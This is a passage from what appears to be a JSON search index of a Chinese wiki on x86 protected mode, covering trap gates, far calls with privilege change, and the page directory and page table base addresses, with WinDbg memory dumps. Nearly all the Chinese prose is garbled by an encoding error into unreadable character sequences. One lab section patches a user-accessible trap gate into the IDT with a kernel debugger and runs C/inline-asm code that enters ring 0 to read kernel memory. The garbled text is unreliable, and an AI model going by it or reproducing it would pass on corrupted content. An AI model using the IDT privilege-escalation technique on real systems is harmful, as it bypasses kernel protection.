Nç­‰ç­‰ã€‚åªæ˜¯TypeåŸŸçš„ç¬¬8ä½ä¸åŒï¼›é™·é˜±é—¨ç¬¬8ä½ä¸º1ï¼Œä¸­æ–­é—¨ä¸º0ï¼›ä»åå…­è¿›åˆ¶æ¥çœ‹ï¼Œé™·é˜±é—¨ä¸ºFï¼Œä¸­æ–­é—¨ä¸ºEã€‚ å’Œä¸­æ–­é—¨çš„åŒºåˆ« é—¨ æ‰§è¡Œæ—¶ ä¸­æ–­é—¨ ä¼šå°†IFä½æ¸…é›¶ é™·é˜±é—¨ ä¸ä¼šå°†IFä½æ¸…é›¶ å®éªŒ æ„é€ é™·é˜±é—¨ï¼Œå®ç°ææƒåè¯»å–é«˜2Gçš„åœ°å€å¹¶åˆ†æå †æ ˆæƒ…å†µ å®éªŒè¿‡ç¨‹æ„é€ é™·é˜±é—¨æè¿°ç¬¦æµ‹è¯•ä»£ç è¿è¡Œç»“æœå †æ ˆåˆ†ææ„é€ çš„é—¨æè¿°ç¬¦ï¼ˆDPL=3ï¼‰ï¼š0040EF00`000810201234567891011121314151617181920212223242526272829303132333435363738kd&gt; dq 8003f400 L228003f400 80538e00`0008f19c 80538e00`0008f3148003f410 00008500`0058113e 8053ee00`0008f6e48003f420 8053ee00`0008f864 80538e00`0008f9c08003f430 80538e00`0008fb34 80548e00`0008019c8003f440 00008500`00501198 80548e00`000805c08003f450 80548e00`000806e0 80548e00`000808208003f460 80548e00`00080a7c 80548e00`00080d608003f470 80548e00`00081450 80548e00`000817808003f480 80548e00`000818a0 80548e00`000819d88003f490 80548500`00a01780 80548e00`00081b408003f4a0 80548e00`00081780 80548e00`000817808003f4b0 80548e00`00081780 80548e00`000817808003f4c0 80548e00`00081780 80548e00`000817808003f4d0 80548e00`00081780 80548e00`000817808003f4e0 80548e00`00081780 80548e00`000817808003f4f0 80548e00`00081780 806d8e00`00082fd08003f500 00000000`00080000 00000000`00080000kd&gt; eq 8003f500 0040EF00`00081020kd&gt; dq 8003f400 L228003f400 80538e00`0008f19c 80538e00`0008f3148003f410 00008500`0058113e 8053ee00`0008f6e48003f420 8053ee00`0008f864 80538e00`0008f9c08003f430 80538e00`0008fb34 80548e00`0008019c8003f440 00008500`00501198 80548e00`000805c08003f450 80548e00`000806e0 80548e00`000808208003f460 80548e00`00080a7c 80548e00`00080d608003f470 80548e00`00081450 80548e00`000817808003f480 80548e00`000818a0 80548e00`000819d88003f490 80548500`00a01780 80548e00`00081b408003f4a0 80548e00`00081780 80548e00`000817808003f4b0 80548e00`00081780 80548e00`000817808003f4c0 80548e00`00081780 80548e00`000817808003f4d0 80548e00`00081780 80548e00`000817808003f4e0 80548e00`00081780 80548e00`000817808003f4f0 80548e00`00081780 806d8e00`00082fd08003f500 0040ef00`00081020 00000000`00080000kd&gt; gä»£ç å’Œè‡ªå·±æ„é€ ä¸­æ–­é—¨é‚£ä¸ªmdçš„ä»£ç ä¸€æ ·ï¼Œå°±åªæ˜¯windbgæ”¹é—¨æè¿°ç¬¦ä¸ä¸€æ ·123456789101112131415161718192021222324252627282930313233343536373839#include &lt;stdio.h&gt;#include &lt;windows.h&gt;BYTE IDTItem[8]=&#123;0&#125;;//åˆ‡æ¢å †æ ˆåæ‰§è¡Œçš„ä»£ç void __declspec(naked) R0Func() //00401020 &#123; __asm &#123; //int 3 //è®©æ–­ç‚¹åœåœ¨windbgï¼Œè®©æˆ‘ä»¬åˆ†æä¸‹å¯„å­˜å™¨å’Œå †æ ˆ pushad pushfd mov eax,0x8003f400 //è¯»å–é«˜2Gçš„åœ°å€ï¼Œåœ°å€æ˜¯IDTè¡¨åŸºå€ mov ebx,[eax] mov dword ptr ds:[IDTItem],ebx //IDTè¡¨ç¬¬ä¸€ä¸ªå…ƒç´ çš„ä½32ä½ï¼ˆå°ç«¯åºï¼‰ mov ecx,[eax+0x4] mov dword ptr ds:[IDTItem+0x4],ecx //IDTè¡¨ç¬¬ä¸€ä¸ªå…ƒç´ çš„é«˜32ä½ï¼ˆå°ç«¯åºï¼‰ popfd popad iretd //iretä¼šè“å±ï¼Œå› ä¸ºiretçš„ç¡¬ç¼–ç æ˜¯66CFï¼Œ32ä½ä¸‹åº”è¯¥ä½¿ç”¨iretdï¼Œç¡¬ç¼–ç æ˜¯C &#125;&#125;int main()&#123; __asm &#123; int 0x20 //ç´¢å¼•å·32ï¼Œ8003f500 &#125; printf(&quot;%08x`%08x &quot;,*(PDWORD)((PBYTE)IDTItem+0x4),*(PDWORD)IDTItem);//å¤„ç†æˆï¼šæŒ‰windbgçš„dqé‚£æ ·æ˜¾ç¤ºæ•°æ® getchar(); return 0;&#125;è°ƒç”¨ä¸­æ–­é—¨å‰è°ƒç”¨ä¸­eflagå¯„å­˜å™¨è°ƒç”¨å‰åIFä½æ²¡å˜"},{"title":"è·¨æ®µè·³è½¬","path":"/wiki/Protected_Mode/è·¨æ®µè·³è½¬.html","content":"è¦ç‚¹å›é¡¾ æˆ‘ä»¬é€šè¿‡JMP FARå¯ä»¥å®ç°æ®µé—´çš„è·³è½¬ï¼Œå¦‚æœè¦å®ç°è·¨æ®µçš„è°ƒç”¨å°±å¿…é¡»è¦å­¦ä¹ CALL FAR,ä¹Ÿå°±æ˜¯é•¿è°ƒç”¨ã€‚ CALL FARæ¯”JMP FARè¦å¤æ‚ï¼ŒJMPå¹¶ä¸å½±å“å †æ ˆ,ä½†CALLæŒ‡ä»¤ä¼šå½±å“ã€‚ å°ç»“å¯¹æ¯” è·¨æ®µè·³è½¬åˆ†ä¸ºçŸ­è°ƒç”¨å’Œé•¿è°ƒç”¨ã€‚é•¿è°ƒç”¨åˆ†ä¸ºææƒæˆ–ä¸ææƒï¼Œä¸‰è€…å¯¹æ¯”è¡¨å¦‚ä¸‹ã€‚ è°ƒç”¨æ–¹å¼ æŒ‡ä»¤æ ¼å¼ å‘ç”Ÿæ”¹å˜çš„å¯„å­˜å™¨ å †æ ˆå˜åŒ–ï¼ˆä»å·¦åˆ°å³ä¸ºå…¥æ ˆé¡ºåºï¼‰ å¤‡æ³¨ çŸ­è°ƒç”¨ CALL ç«‹å³æ•°/å¯„å­˜å™¨/å†…å­˜ ESPã€EIP è¿”å›åœ°å€ é•¿è°ƒç”¨ï¼ˆè·¨æ®µä¸ææƒï¼‰ CALL CS:EIP ;(EIPå®é™…ä¸Šæ˜¯åºŸå¼ƒä¸ä½¿ç”¨çš„) ESPã€EIPã€CS è°ƒç”¨è€…CSã€è¿”å›åœ°å€ é•¿è°ƒç”¨ï¼ˆè·¨æ®µå¹¶ææƒï¼‰ CALL CS:EIP ;(EIPå®é™…ä¸Šæ˜¯åºŸå¼ƒä¸ä½¿ç”¨çš„) ESPã€EIPã€CSã€SS è°ƒç”¨è€…SSã€è°ƒç”¨è€…ESPã€è°ƒç”¨è€…CSã€è¿”å›åœ°å€ å› ä¸ºææƒäº†ï¼Œæ¯”å¦‚ä»3ç¯åˆ°0ç¯ã€‚é‚£ä¹ˆSSéšç€CSçš„CPLä¸€èµ·å˜äº†ï¼›callåä½¿ç”¨çš„å †æ ˆå˜äº†ï¼ŒåŸæœ¬ä½¿ç”¨çš„æ˜¯3ç¯çš„å †æ ˆï¼Œç°åœ¨ä½¿ç”¨çš„æ˜¯0ç¯çš„å †æ ˆã€‚ å‹æ ˆé¡ºåºéƒ½æ˜¯x86æŒ‡ä»¤é›†å®šä¹‰å¥½çš„ çŸ­è°ƒç”¨ æŒ‡ä»¤æ ¼å¼ï¼š 1CALL ç«‹å³æ•°/å¯„å­˜å™¨/å†…å­˜ ;æä¾›CALLæŒ‡ä»¤æ‰§è¡Œåè¦è·³è½¬çš„ä»£ç åœ°å€ CALLæŒ‡ä»¤è°ƒç”¨ï¼ŒCPUå°†ä¸‹ä¸€æ¡æŒ‡ä»¤åœ°å€å‹å…¥å †æ ˆï¼ˆESP-4ï¼‰ï¼Œç„¶åè·³è½¬åˆ°ç›®æ ‡åœ°å€ã€‚RETè¿”å›æ—¶å°†æ ˆé¡¶æ•°æ®èµ‹ç»™EIPï¼ˆESP+4ï¼‰ã€‚ å‘ç”Ÿæ”¹å˜çš„å¯„å­˜å™¨ï¼šESPã€EIPã€‚ é•¿è°ƒç”¨ï¼ˆè·¨æ®µä¸ææƒï¼‰ æŒ‡ä»¤æ ¼å¼ï¼š 1CALL CS:EIP ;(EIPå®é™…ä¸Šæ˜¯åºŸå¼ƒä¸ä½¿ç”¨çš„) EIPçˆ±å†™å•¥å†™å•¥ï¼Œä½†ä¸ºäº†è¯­æ³•æ ¼å¼å…¼å®¹ï¼Œè¿˜æ˜¯å†™äº† CSå……å½“é€‰æ‹©å­ï¼ŒæŸ¥GDTè¡¨æ‰¾æ®µæè¿°ç¬¦ï¼Œè¿™ä¸ªæ®µæè¿°ç¬¦å¿…é¡»æ˜¯ä¸€ä¸ªè°ƒç”¨é—¨ï¼Œä»è°ƒç”¨é—¨ç®—å‡ºè·³è½¬çš„åœ°å€ï¼ŒEIPåºŸå¼ƒä¸ç”¨ã€‚ è·¨æ®µä¸ææƒï¼š è·¨æ®µï¼šCSå˜äº†ã€‚ ä¸ææƒï¼šå½“å‰CSçš„CPLå’Œæ‰¾åˆ°çš„æ®µæè¿°ç¬¦çš„DPLä¸€æ ·ã€‚ å †æ ˆä¼šå‹å…¥è°ƒç”¨è€…CSæ®µå¯„å­˜å™¨ã€‚å¦‚æœä¸å‹å…¥ï¼Œå°±ä¸¢å¤±äº†è°ƒç”¨å‰CSçš„å€¼ã€‚ è¿”å›æ—¶ç”¨é•¿è¿”å›æŒ‡ä»¤ 1RETF å‘ç”Ÿæ”¹å˜çš„å¯„å­˜å™¨ï¼šESPã€EIPã€CSã€‚ é•¿è°ƒç”¨ï¼ˆè·¨æ®µå¹¶ææƒï¼‰ æŒ‡ä»¤æ ¼å¼ï¼š 1CALL CS:EIP ;(EIPå®é™…ä¸Šæ˜¯åºŸå¼ƒä¸ä½¿ç”¨çš„) ï¼ˆå›¾ä¸­ESP3ï¼Œæƒ³è¯´æ˜è¿™æ˜¯ä¸€ä¸ª3ç¯çš„å †æ ˆã€‚ESP0æƒ³è¯´æ˜è¿™æ˜¯ä¸€ä¸ª0ç¯çš„å †æ ˆï¼‰ã€‚ å› ä¸ºæ˜¯ä¸€ä¸ªè·¨æ®µä¸”ææƒçš„è°ƒç”¨ï¼ŒCSçš„CPLå˜äº†ï¼ŒSSçš„CPLä¹Ÿä¼šè·Ÿç€å˜ã€‚ä»ä¸€ä¸ªCPLçš„å †æ ˆè·³åˆ°å¦ä¸€ä¸ªCPLçš„å †æ ˆï¼Œä½¿ç”¨çš„å †æ ˆå˜äº†ï¼ŒESPå˜äº†ã€‚æ‰€ä»¥è¦å‹å…¥SSå’ŒESPã€‚ å‘ç”Ÿæ”¹å˜çš„å¯„å­˜å™¨ï¼šESPã€EIPã€CSã€SSã€‚ æ‰§è¡Œè¿”å›æŒ‡ä»¤æ—¶çš„å †æ ˆå˜åŒ–ï¼š æ€»ç»“ è·¨æ®µè°ƒç”¨æ—¶ï¼Œä¸€æ—¦æœ‰æƒé™åˆ‡æ¢ï¼Œå°±ä¼šåˆ‡æ¢å †æ ˆã€‚ CSçš„æƒé™ä¸€æ—¦æ”¹å˜ï¼ŒSSçš„æƒé™ä¹Ÿè¦éšç€æ”¹å˜ï¼ŒCSä¸SSçš„CPLå¿…é¡»ä¸€æ ·ï¼ˆIntelè§„å®šçš„ï¼‰ã€‚ JMP FARåªèƒ½è·³è½¬åˆ°åŒçº§éä¸€è‡´ä»£ç æ®µï¼Œä½†CALL FARå¯ä»¥é€šè¿‡è°ƒç”¨é—¨ææƒï¼Œæå‡CPLçš„æƒé™ã€‚ SSä¸ESPä»å“ªé‡Œæ¥?å‚è§TSSæ®µã€‚ é—®é¢˜ ebp? ebp 0ç¯8å­—å¤´çš„,3ç¯å°äº8 ebpåªæœ‰ä¸€ä¸ªå•Š.åˆæ²¡æœ‰ä¸¤ä¸ª"},{"title":"é¡µç›®å½•è¡¨åŸºå€","path":"/wiki/Protected_Mode/é¡µç›®å½•è¡¨åŸºå€.html","content":"å‰è¨€ åœ¨ä¸Šä¸€èŠ‚è¯¾è¯¾åé¢˜ä¸­æˆ‘ä»¬æåˆ°è¿‡ï¼Œå¦‚æœç³»ç»Ÿè¦ä¿è¯æŸä¸ªçº¿æ€§åœ°å€æ˜¯æœ‰æ•ˆçš„, é‚£ä¹ˆå¿…é¡»ä¸ºå…¶å¡«å……æ­£ç¡®çš„PDEä¸PTEï¼Œå¦‚æœæˆ‘ä»¬æƒ³å¡«å……PDEä¸PTEé‚£ä¹ˆå¿…é¡»èƒ½å¤Ÿè®¿é—®PDTä¸PTT,é‚£ä¹ˆå­˜åœ¨2ä¸ªé—®é¢˜: 1ã€ä¸€å®šå·²ç»æœ‰â€œäºº&quot;ä¸ºæˆ‘ä»¬è®¿é—®PDTä¸PTTæŒ‚å¥½äº†PDEä¸PTE,æˆ‘ä»¬åªæœ‰æ‰¾åˆ°è¿™ä¸ªçº¿æ€§åœ°å€å°±å¯ä»¥äº†ã€‚ 2ã€è¿™ä¸ªä¸ºæˆ‘ä»¬æŒ‚å¥½PDEä¸PTEçš„â€œäºº&quot;æ˜¯è°? ç­”æ¡ˆå½“æˆ‘ä»¬ç”³è¯·ä¸€å—å†…å­˜æ—¶ï¼Œæ€ä¹ˆå»PDTå’ŒPTTæŒ‚ä¸Šç›¸åº”çš„PDEå’ŒPTEï¼ŸPDTå’ŒPTTæ˜¯ç‰©ç†åœ°å€ï¼Œç»™ç‰©ç†åœ°å€çš„è¯ï¼Œæˆ‘ä»¬å’Œæ“ä½œç³»ç»Ÿå¦‚ä½•è®¿é—®ï¼Ÿå› ä¸ºç¨‹åºä½¿ç”¨çš„éƒ½æ˜¯çº¿æ€§åœ°å€ï¼Œæ— æ³•ç›´æ¥ä½¿ç”¨ç‰©ç†åœ°å€ã€‚é‚£ä¹ˆæˆ‘ä»¬æƒ³åˆ°è¯»å†™PDTå’ŒPTTè¡¨ï¼Œå¡«ä¸ŠPDEå’ŒPTEå¿…é¡»ç”¨åˆ°çº¿æ€§åœ°å€ã€‚æ‰€ä»¥CPUç»™æˆ‘ä»¬å‡†å¤‡äº†çº¿æ€§åœ°å€0xC0300000ï¼Œé€šè¿‡è¿™ä¸ªçº¿æ€§åœ°å€ï¼Œå°±å¯ä»¥æ‰¾åˆ°PDTè¡¨å¤´çš„ç‰©ç†åœ°å€ï¼›çº¿æ€§åœ°å€0xC0000000ï¼Œé€šè¿‡è¿™ä¸ªçº¿æ€§åœ°å€ï¼Œå°±å¯ä»¥æ‰¾åˆ°PTTè¡¨å¤´çš„ç‰©ç†åœ°å€ é¡µç›®å½•è¡¨ï¼ˆPDEï¼‰åŸºå€ 0xC0300000 1234çº¿æ€§åœ°å€0xC0300000æ‹†åˆ†1100000000,300 //10 ;400*4=C001100000000,300 //10 ;400*4=C00000 //12 ä»¥notepadè¿›ç¨‹ä¸ºä¾‹ï¼Œwindbgä¸‹æ–­ï¼ŒæŸ¥CR3ï¼Œæ˜¯109df000 123PROCESS 85fb2da0 SessionId: 0 Cid: 00b8 Peb: 7ffd6000 ParentCid: 0714 DirBase: 109df000 ObjectTable: e220e6f0 HandleCount: 44. Image: notepad.exe CR3->PDTè¡¨ A.CR3æŒ‡å‘çš„æ˜¯PDTè¡¨ æŸ¥çœ‹CR3å¤„çš„æ•°æ®å¾—åˆ°çš„å°±æ˜¯PDTè¡¨ 123456789kd&gt; !dd 109df000#109df000 10801067 10c26067 10876067 00000000#109df010 10934067 00000000 00000000 00000000#109df020 00000000 00000000 00000000 00000000#109df030 00000000 00000000 00000000 00000000#109df040 00000000 00000000 00000000 00000000#109df050 00000000 00000000 00000000 00000000#109df060 00000000 00000000 00000000 00000000#109df070 00000000 00000000 00000000 00000000 CR3->PDE->PTE->ç‰©ç†é¡µçš„æ–¹å¼æ‰¾0xC0300000çš„ç‰©ç†é¡µ æŒ‰ä¹‹å‰å­¦çš„CR3+ç¬¬ä¸€ä¸ª10Ã—4â€“&gt;PDEï¼ŒPDE+ç¬¬äºŒä¸ª10Ã—4â€“&gt;PTEï¼ŒPDE+12ä½â€“&gt;ç‰©ç†é¡µï¼Œæ¥æ‰¾ä¸€é a.CR3+çº¿æ€§åœ°å€0xC0300000æ‹†åˆ†åç¬¬1ä¸ª10ä½*4 å¾—åˆ°PDEæ˜¯109df063 123456789kd&gt; !dd 109df000+C00#109dfc00 109df063 109a0063 00000000 06a50163#109dfc10 06a51163 06a52163 06a53163 06a54163#109dfc20 06a55163 06a56163 06a57163 06a58163#109dfc30 06a59163 06a5a163 06a5b163 06a5c163#109dfc40 06a5d163 06a5e163 06a5f163 06a60163#109dfc50 06a61163 06a62163 06a63163 06a64163#109dfc60 06a65163 06a66163 06a67163 06a68163#109dfc70 06a29163 06a2a163 06a2b163 06a2c163 b.PDE+çº¿æ€§åœ°å€0xC0300000æ‹†åˆ†åç¬¬2ä¸ª10ä½*4 å¾—åˆ°PTEæ˜¯109df063 123456789kd&gt; !dd 109df000+C00#109dfc00 109df063 109a0063 00000000 06a50163#109dfc10 06a51163 06a52163 06a53163 06a54163#109dfc20 06a55163 06a56163 06a57163 06a58163#109dfc30 06a59163 06a5a163 06a5b163 06a5c163#109dfc40 06a5d163 06a5e163 06a5f163 06a60163#109dfc50 06a61163 06a62163 06a63163 06a64163#109dfc60 06a65163 06a66163 06a67163 06a68163#109dfc70 06a29163 06a2a163 06a2b163 06a2c163 c.PTE+çº¿æ€§åœ°å€0xC0300000æ‹†åˆ†å12ä½ å¾—åˆ°ç‰©ç†é¡µ 123456789kd&gt; !dd 109df000+000#109df000 10801067 10c26067 10876067 00000000#109df010 10934067 00000000 00000000 00000000#109df020 00000000 00000000 00000000 00000000#109df030 00000000 00000000 00000000 00000000#109df040 00000000 00000000 00000000 00000000#109df050 00000000 00000000 00000000 00000000#109df060 00000000 00000000 00000000 00000000#109df070 00000000 00000000 00000000 00000000 è§‚å¯ŸAè¾“å‡ºçš„å†…å®¹ï¼ˆCR3æŒ‡å‘PDTè¡¨ï¼‰ å’Œ é€šè¿‡æ­¥éª¤abcè¾“å‡ºçš„å†…å®¹ï¼ˆçº¿æ€§åœ°å€0xC0300000å¯¹åº”çš„ç‰©ç†é¡µï¼‰ï¼Œå¾—å‡ºç»“è®ºï¼š PDTè¡¨æ˜¯ä¸€å¼ ç‰©ç†é¡µ çº¿æ€§åœ°å€0xC0300000æ‰¾åˆ°çš„ç‰©ç†é¡µæ˜¯PDTè¡¨ è§‚å¯Ÿæ­¥éª¤aï¼ˆæŸ¥PDEé¡¹ï¼‰å’Œæ­¥éª¤bï¼ˆæŸ¥PTEé¡¹ï¼‰è¾“å‡ºçš„å†…å®¹ï¼Œå¾—å‡ºç»“è®ºï¼š PDTè¡¨ï¼Œæœ¬èº«ä¹Ÿæ˜¯é¡µè¡¨ å°ç»“ å…¶å®ä¸å­˜åœ¨é¡µç›®å½•è¡¨ï¼ˆPDTï¼‰ï¼Œé¡µç›®å½•è¡¨ï¼ˆPDTï¼‰å°±æ˜¯é¡µè¡¨ï¼ˆPTTï¼‰ä¸­ç‰¹æ®Šçš„ä¸€å¼ è¡¨ã€‚ è¿™å¼ è¡¨æ˜¯å¼ ç‰©ç†é¡µï¼Œæ—¢å……å½“äº†é¡µç›®å½•è¡¨ï¼ˆPDTï¼‰ï¼Œä¹Ÿå……å½“äº†é¡µè¡¨ï¼ˆPTTï¼‰ã€‚ ä»å……å½“äº†é¡µè¡¨ï¼ˆPTTï¼‰çš„è§’åº¦çœ‹ï¼Œå®ƒæ˜¯ä¸€å¼ ç‰¹æ®Šçš„é¡µè¡¨ï¼ˆPTTï¼‰ï¼Œå› ä¸ºæ¯ä¸€é¡¹PTEæ²¡æœ‰æŒ‡å‘ç‰©ç†é¡µï¼Œè€Œæ˜¯æŒ‡å‘å…¶ä»–é¡µè¡¨ï¼ˆPTTï¼‰ï¼Œæœ‰ä¸€é¡¹æŒ‡å‘è‡ªå·±è¡¨å¤´ã€‚ é€šè¿‡çº¿æ€§åœ°å€0xC0300000æ‰¾åˆ°çš„ç‰©ç†é¡µå°±æ˜¯é¡µç›®å½•è¡¨ï¼ˆPDTï¼‰ã€‚ å¦‚æœæˆ‘ä»¬è¦è®¿é—®ç¬¬Nä¸ªPDEï¼Œå…¬å¼ï¼š0xC0300000+N*4 æ ¹æ®ä¸Šé¢çš„æ¨å¯¼ï¼Œæˆ‘ä»¬ä¿®æ­£ä¸€ä¸‹ä¹‹å‰CR3-&gt;PDT-&gt;PTT-&gt;ç‰©ç†é¡µå¯»å€çš„è¿™å¼ å›¾ï¼š ä¿®æ­£ä¸ºï¼š ç»ƒä¹ +æ€è€ƒ é€šè¿‡ä¸Šé¢çš„å­¦ä¹ ï¼Œæˆ‘ä»¬çŸ¥é“äº†çº¿æ€§åœ°å€0xC0300000æŒ‡å‘äº†PDTè¡¨ï¼Œç„¶åç”¨å…¬å¼0xC0300000+N*4èƒ½å»æ”¹ä»»æ„çš„PDEé¡¹ã€‚å¦‚æœæˆ‘ä»¬æƒ³è¦ç»™çº¿æ€§åœ°å€0æŒ‚ä¸Šç‰©ç†é¡µï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡ä¸‹é¢è¿™è¡ŒæŒ‡ä»¤è¿›è¡Œä¿®æ”¹ï¼ˆä¼ªç ï¼‰ 1mov dword ptr ds:[0xC0300000],0x10101010 ç„¶åï¼Œæ€ä¹ˆä¿®æ”¹PTEï¼Ÿ ç­”æ¡ˆæ€ç»´è¯¯åŒºï¼Œwindbgä¸­é€šè¿‡PDEé¡¹æŸ¥å‡ºæ¥çš„PTTè¡¨å†…å®¹ï¼Œä¾æ—§æ˜¯ç‰©ç†åœ°å€ï¼Œæ— æ³•åœ¨ç¨‹åºä¸­ä½¿ç”¨ã€‚ä¹Ÿå°±æ˜¯è¯´ï¼Œä»…æœ‰çº¿æ€§åœ°å€0xC0300000åªèƒ½åŠ¨PDEï¼Œä½†æ˜¯æ²¡æ³•ä¿®æ”¹PTEã€‚æ‰€ä»¥è¿˜éœ€è¦1ä¸ªçº¿æ€§åœ°å€ï¼Œé€šè¿‡è¿™ä¸ªçº¿æ€§åœ°å€ï¼Œå¯ä»¥ä¿®æ”¹åˆ°PTEé¡¹ã€‚"},{"title":"é¡µè¡¨åŸºå€","path":"/wiki/Protected_Mode/é¡µè¡¨åŸºå€.html","content":"å‰è¨€ æ ¹æ®ä¸Šä¸€ç¯‡æ–‡ç« çš„ç»ƒä¹ +æ€è€ƒé¢˜å¯çŸ¥ï¼Œå…‰æœ‰é¡µç›®å½•è¡¨ï¼ˆPDTï¼‰åŸºå€è¿˜ä¸å¤Ÿï¼Œå› ä¸ºå†³å®šä¸€ä¸ªçº¿æ€§åœ°å€æ˜¯å¦æœ‰æ•ˆæ—¢å–å†³äºPDEï¼Œåˆå–å†³äºPTEã€‚é‚£é¡µè¡¨ï¼ˆPTEï¼‰åŸºå€æ˜¯ï¼Ÿ é¡µè¡¨ï¼ˆPTEï¼‰åŸºå€ 0xC0000000 1234çº¿æ€§åœ°å€0xC0000000æ‹†åˆ†1100000000,300 //10 ;400*4=C000000000000 //10000 //12 ä»¥notepadè¿›ç¨‹ä¸ºä¾‹ï¼Œwindbgä¸‹æ–­ï¼ŒæŸ¥CR3ï¼Œæ˜¯109df000 CR3->PDTè¡¨ï¼Œçœ‹PDTè¡¨å†…å®¹ A.é€šè¿‡CR3-&gt;çš„PDTè¡¨é‡Œçš„PDEï¼Œæ‰¾åˆ°æ‰€æŒ‡å‘çš„PTTè¡¨ æŸ¥çœ‹CR3å¤„çš„æ•°æ®å¾—åˆ°çš„æ˜¯PDTè¡¨ï¼Œé‡Œé¢çš„æ¯ä¸€é¡¹PDEæŒ‡å‘äº†PTTè¡¨ 123456789kd&gt; !dd 109df000#109df000 10801067 10c26067 10876067 00000000#109df010 10934067 00000000 00000000 00000000#109df020 00000000 00000000 00000000 00000000#109df030 00000000 00000000 00000000 00000000#109df040 00000000 00000000 00000000 00000000#109df050 00000000 00000000 00000000 00000000#109df060 00000000 00000000 00000000 00000000#109df070 00000000 00000000 00000000 00000000 æ¯”å¦‚ï¼Œç¬¬1é¡¹PDEï¼š10801067ï¼ŒæŒ‡å‘äº†ç¬¬1ä¸ªPTTè¡¨ï¼ŒPTTè¡¨çš„å†…å®¹å¦‚ä¸‹ï¼š 123456789kd&gt; !dd 10801000#10801000 00000000 00000000 00000000 00000000#10801010 00000000 00000000 00000000 00000000#10801020 00000000 00000000 00000000 00000000#10801030 00000000 00000000 00000000 00000000#10801040 107c2067 00000000 00000000 00000000#10801050 00000000 00000000 00000000 00000000#10801060 00000000 00000000 00000000 00000000#10801070 00000000 00000000 00000000 00000000 æ¯”å¦‚ï¼Œç¬¬2é¡¹PDEï¼š10c26067ï¼ŒæŒ‡å‘äº†ç¬¬2ä¸ªPTTè¡¨ï¼ŒPTTè¡¨çš„å†…å®¹å¦‚ä¸‹ï¼š 123456789kd&gt; !dd 10c26000#10c26000 10af4067 10735067 00000080 00000000#10c26010 00000000 00000000 00000000 00000000#10c26020 00000000 00000000 00000000 00000000#10c26030 00000000 00000000 00000000 00000000#10c26040 10c27067 10b68067 10c69067 10b2a067#10c26050 10a6c067 10a2d067 10b6e067 109ab067#10c26060 00000000 00000000 00000000 00000000#10c26070 00000000 00000000 00000000 00000000 CR3->PDE->PTE->ç‰©ç†é¡µçš„æ–¹å¼æ‰¾0xC0000000çš„ç‰©ç†é¡µ æŒ‰ä¹‹å‰å­¦çš„CR3+ç¬¬ä¸€ä¸ª10Ã—4â€“&gt;PDEï¼ŒPDE+ç¬¬äºŒä¸ª10Ã—4â€“&gt;PTEï¼ŒPDE+12ä½â€“&gt;ç‰©ç†é¡µï¼Œæ¥æ‰¾ä¸€é 0xC0000000 a.CR3+çº¿æ€§åœ°å€0xC0000000æ‹†åˆ†åç¬¬1ä¸ª10ä½*4 å¾—åˆ°PDEæ˜¯109df063 123456789kd&gt; !dd 109df000+C00#109dfc00 109df063 109a0063 00000000 06a50163#109dfc10 06a51163 06a52163 06a53163 06a54163#109dfc20 06a55163 06a56163 06a57163 06a58163#109dfc30 06a59163 06a5a163 06a5b163 06a5c163#109dfc40 06a5d163 06a5e163 06a5f163 06a60163#109dfc50 06a61163 06a62163 06a63163 06a64163#109dfc60 06a65163 06a66163 06a67163 06a68163#109dfc70 06a29163 06a2a163 06a2b163 06a2c163 b.PDE+çº¿æ€§åœ°å€0xC0300000æ‹†åˆ†åç¬¬2ä¸ª10ä½*4 å¾—åˆ°PTEæ˜¯109df063 123456789kd&gt; !dd 109df000#109df000 10801067 10c26067 10876067 00000000#109df010 10934067 00000000 00000000 00000000#109df020 00000000 00000000 00000000 00000000#109df030 00000000 00000000 00000000 00000000#109df040 00000000 00000000 00000000 00000000#109df050 00000000 00000000 00000000 00000000#109df060 00000000 00000000 00000000 00000000#109df070 00000000 00000000 00000000 00000000 c.PTE+çº¿æ€§åœ°å€0xC0000000æ‹†åˆ†å12ä½ å¾—åˆ°ç‰©ç†é¡µ 123456789kd&gt; !dd 10801000#10801000 00000000 00000000 00000000 00000000#10801010 00000000 00000000 00000000 00000000#10801020 00000000 00000000 00000000 00000000#10801030 00000000 00000000 00000000 00000000#10801040 107c2067 00000000 00000000 00000000#10801050 00000000 00000000 00000000 00000000#10801060 00000000 00000000 00000000 00000000#10801070 00000000 00000000 00000000 00000000 CR3->PDE->PTE->ç‰©ç†é¡µçš„æ–¹å¼æ‰¾0xC0001000çš„ç‰©ç†é¡µ æŒ‰ä¹‹å‰å­¦çš„CR3+ç¬¬ä¸€ä¸ª10Ã—4â€“&gt;PDEï¼ŒPDE+ç¬¬äºŒä¸ª10Ã—4â€“&gt;PTEï¼ŒPDE+12ä½â€“&gt;ç‰©ç†é¡µï¼Œæ¥æ‰¾ä¸€é 0xC0001000 1234çº¿æ€§åœ°å€0xC0001000æ‹†åˆ†1100000000,300 //10 ;400*4=C000000000001,1 //10 ;1*4=4000 //12 a.CR3+çº¿æ€§åœ°å€0xC0001000æ‹†åˆ†åç¬¬1ä¸ª10ä½*4 å¾—åˆ°PDEæ˜¯109df063 123456789kd&gt; !dd 109df000+C00#109dfc00 109df063 109a0063 00000000 06a50163#109dfc10 06a51163 06a52163 06a53163 06a54163#109dfc20 06a55163 06a56163 06a57163 06a58163#109dfc30 06a59163 06a5a163 06a5b163 06a5c163#109dfc40 06a5d163 06a5e163 06a5f163 06a60163#109dfc50 06a61163 06a62163 06a63163 06a64163#109dfc60 06a65163 06a66163 06a67163 06a68163#109dfc70 06a29163 06a2a163 06a2b163 06a2c163 b.PDE+çº¿æ€§åœ°å€0xC0001000æ‹†åˆ†åç¬¬2ä¸ª10ä½*4 å¾—åˆ°PTEæ˜¯10c26067 123456789kd&gt; !dd 109df000+4#109df004 10c26067 10876067 00000000 10934067#109df014 00000000 00000000 00000000 00000000#109df024 00000000 00000000 00000000 00000000#109df034 00000000 00000000 00000000 00000000#109df044 00000000 00000000 00000000 00000000#109df054 00000000 00000000 00000000 00000000#109df064 00000000 00000000 00000000 00000000#109df074 00000000 00000000 00000000 00000000 c.PTE+çº¿æ€§åœ°å€0xC0001000æ‹†åˆ†å12ä½ å¾—åˆ°ç‰©ç†é¡µ 123456789kd&gt; !dd 10c26000#10c26000 10af4067 10735067 00000080 00000000#10c26010 00000000 00000000 00000000 00000000#10c26020 00000000 00000000 00000000 00000000#10c26030 00000000 00000000 00000000 00000000#10c26040 10c27067 10b68067 10c69067 10b2a067#10c26050 10a6c067 10a2d067 10b6e067 109ab067#10c26060 00000000 00000000 00000000 00000000#10c26070 00000000 00000000 00000000 00000000 